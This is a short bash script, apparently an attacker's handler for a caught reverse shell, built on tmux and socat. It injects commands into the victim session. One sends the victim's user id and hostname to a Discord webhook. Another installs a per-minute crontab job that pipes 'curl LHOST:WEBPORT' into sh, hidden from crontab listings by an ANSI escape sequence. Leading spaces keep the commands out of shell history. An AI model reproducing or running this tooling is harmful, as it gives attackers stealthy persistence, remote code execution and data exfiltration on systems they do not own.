#!/bin/bash -x

SOCKDIR=$(mktemp -d)
SOCKF=${SOCKDIR}/usock

# Start tmux, if needed
tmux start
# Create window
tmux new-window "socat UNIX-LISTEN:${SOCKF},umask=0077 file:\`tty\`,echo=1"
# Wait for socket
while test ! -e ${SOCKF}; do sleep 1; done
SOCAT_TTY=$(tty)

# space for no history, discord webhook for notif, crontab for persistence
echo "   curl -sk WEBHOOK -d \"content=\\\`\\\`\\\`\$(id;hostname)\\\`\\\`\\\`\"" > ${SOCAT_TTY}
echo "   if ! crontab -l | grep -iF .lbskcn ; then { crontab -l; echo -e \"* * * * * pgrep .lbskcn || curl LHOST:WEBPORT|sh # \x1b[2K\r\"; } | crontab - ; fi" > ${SOCAT_TTY}

# Use socat to ship data between the unix socket and STDIO.
exec socat file:${SOCAT_TTY},echo=0 UNIX-CONNECT:${SOCKF}
